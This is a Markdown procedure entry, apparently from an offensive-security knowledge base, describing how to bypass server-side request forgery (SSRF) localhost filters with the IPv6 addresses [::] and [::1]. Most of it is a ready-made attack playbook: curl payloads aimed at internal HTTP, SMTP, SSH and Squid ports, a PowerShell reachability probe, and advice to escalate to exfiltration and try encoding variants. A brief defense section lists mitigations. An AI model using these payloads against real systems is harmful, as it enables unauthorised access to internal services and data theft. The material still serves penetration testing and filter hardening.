---
type: procedure
description: >-
  Use IPv6 loopback addresses to bypass localhost filters in Server-Side Request
  Forgery (SSRF) attacks, allowing access to internal services.
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Exploitation for Defense Evasion|T1211 - Exploitation for
    Defense Evasion]]
  - >-
    [[techniques/Exploitation of Remote Services|T1210 - Exploitation of Remote
    Services]]
sub_techniques: []
tags:
  - '[[tags/Bypassing filters]]'
  - '[[tags/Bypass localhost with [::]]] '
  - '[[tags/Server-Side Request Forgery]]'
commands:
  - '[[commands/access-internal-http-via-ssrf-ipv6-unspecified]]'
  - '[[commands/access-internal-smtp-via-ssrf-ipv6-unspecified]]'
  - '[[commands/access-internal-ssh-via-ssrf-ipv6-unspecified]]'
  - '[[commands/access-internal-squid-via-ssrf-ipv6-unspecified]]'
  - '[[commands/access-internal-http-via-ssrf-ipv6-loopback]]'
  - '[[commands/access-internal-smtp-via-ssrf-ipv6-loopback]]'
  - '[[commands/access-internal-ssh-via-ssrf-ipv6-loopback]]'
  - '[[commands/access-internal-squid-via-ssrf-ipv6-loopback]]'
tools: []
platforms:
  - Web
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses

## Summary

This procedure demonstrates how to bypass SSRF filters that block IPv4 localhost (127.0.0.1) by using IPv6 loopback addresses like [::] or [::1] (equivalent to 0000::1). These payloads trick the vulnerable server into making requests to internal services on common ports such as HTTP (80), SMTP (25), SSH (22), and Squid proxy (3128), enabling access to restricted resources.

## Description

In SSRF attacks, applications often validate inputs to prevent requests to localhost or internal networks, typically checking for IPv4 addresses like 127.0.0.0/8 or 10.0.0.0/8. However, filters may overlook IPv6 equivalents, allowing attackers to use addresses like [::] (IPv6 unspecified/loopback) or [::1] to reach the same internal endpoints. This technique is particularly effective against web applications that fetch external URLs without proper protocol or address validation. The target environment is a web application vulnerable to SSRF, often in cloud or internal network setups where services listen on both IPv4 and IPv6. Success grants access to internal metadata, databases, or other services, potentially leading to lateral movement or data exfiltration.

## Requirements

1. A vulnerable SSRF endpoint (e.g., a web app parameter that fetches URLs server-side).
2. Knowledge of internal service ports (e.g., 80 for HTTP, 25 for SMTP).
3. Network access to the target application.
4. Tools like curl for sending test requests (no special privileges needed).
5. Optional: IPv6 support on the attacker's machine for testing.

## Defense

- Implement comprehensive input validation to block all loopback and private IPv6 ranges (e.g., ::1, fc00::/7).
- Use a Web Application Firewall (WAF) to detect and block requests containing IPv6 loopback addresses or unusual port combinations.
- Monitor application logs and network traffic for internal connections initiated from the web server, especially to localhost equivalents.
- Disable unnecessary internal services or restrict them to IPv4-only if IPv6 is not required.

## Objectives

1. Bypass localhost filters to access internal HTTP, SMTP, SSH, or proxy services.
2. Retrieve sensitive data from internal endpoints (e.g., web server responses, email server banners).
3. Enable further lateral movement by interacting with internal infrastructure.
4. Demonstrate the SSRF vulnerability for reporting or exploitation.

## Instructions

### Step 1: Verify IPv6 Loopback Accessibility

**Context**: Before crafting payloads, confirm the target server resolves IPv6 loopback addresses to internal services. This step tests if the server can connect to [::] or [::1] without triggering filters.

Use PowerShell (on Windows) or equivalent tools to probe, but adapt for your environment. For SSRF context, this is conceptual; actual testing occurs via the vulnerable endpoint.

**Command** (not linked as it's prerequisite; use built-in tools):
```powershell
Test-NetConnection -ComputerName [::1] -Port 80 -InformationLevel Detailed
```

> This checks if port 80 is reachable on IPv6 loopback. Why: Ensures the internal service listens on IPv6. Expected: Success if TCPTestSucceeded is True; failure indicates IPv6 is disabled or filtered.

### Step 2: Prepare SSRF Payloads Using Unspecified IPv6 Address

**Context**: Use the unspecified IPv6 address [::] to bypass filters, as it may resolve to loopback in some parsers. Reference the payload list for common services.

Embed [[codes/ssrf-ipv6-payloads-unspecified-address]] in your requests.

For HTTP access, send the payload via the vulnerable parameter.

**Command** ([[commands/access-internal-http-via-ssrf-ipv6-unspecified]]):
```bash
curl "http://target.com/ssrf?url=http://[::]:80/"
```

> This sends an SSRF payload to fetch the internal HTTP service. Why: Bypasses IPv4 localhost blocks. Expected: Internal web page content or 200 OK response.

Repeat for other services:

**Command** ([[commands/access-internal-smtp-via-ssrf-ipv6-unspecified]]):
```bash
curl "http://target.com/ssrf?url=http://[::]:25/"
```

> Attempts SMTP access; may return server banner if the fetcher supports it. Expected: SMTP greeting like "220 mail.internal ESMTP".

**Command** ([[commands/access-internal-ssh-via-ssrf-ipv6-unspecified]]):
```bash
curl "http://target.com/ssrf?url=http://[::]:22/"
```

> Targets SSH; useful for banner grabbing. Expected: SSH version banner or connection refused.

**Command** ([[commands/access-internal-squid-via-ssrf-ipv6-unspecified]]):
```bash
curl "http://target.com/ssrf?url=http://[::]:3128/"
```

> Accesses Squid proxy. Expected: Proxy response or error indicating internal reach.

### Step 3: Prepare SSRF Payloads Using Explicit IPv6 Loopback

**Context**: If [::] is filtered, use the explicit loopback [::1] (shortened as 0000::1). This is more reliably blocked but often missed in legacy filters.

Embed [[codes/ssrf-ipv6-payloads-loopback-address]].

**Command** ([[commands/access-internal-http-via-ssrf-ipv6-loopback]]):
```bash
curl "http://target.com/ssrf?url=http://[0000::1]:80/"
```

> Fetches internal HTTP via explicit loopback. Why: Targets IPv6-specific resolutions. Expected: Internal HTTP response body.

**Command** ([[commands/access-internal-smtp-via-ssrf-ipv6-loopback]]):
```bash
curl "http://target.com/ssrf?url=http://[0000::1]:25/"
```

> SMTP probe. Expected: Server banner or protocol response.

**Command** ([[commands/access-internal-ssh-via-ssrf-ipv6-loopback]]):
```bash
curl "http://target.com/ssrf?url=http://[0000::1]:22/"
```

> SSH access attempt. Expected: Banner like "SSH-2.0-OpenSSH_8.2".

**Command** ([[commands/access-internal-squid-via-ssrf-ipv6-loopback]]):
```bash
curl "http://target.com/ssrf?url=http://[0000::1]:3128/"
```

> Squid proxy access. Expected: Proxy identification response.

### Step 4: Analyze Responses and Escalate

**Context**: Review outputs for success indicators like internal banners or data. If successful, chain with other techniques (e.g., use proxy access for further SSRF).

Decision point: If response contains internal content, proceed to exfiltration; if blocked, try URL encoding or protocol variations (e.g., http://[0:0:0:0:0:0:0:1]:80/).

> No specific command; manually inspect curl output. Expected: Evidence of internal access (e.g., metadata, files). Why: Validates bypass and informs next steps.
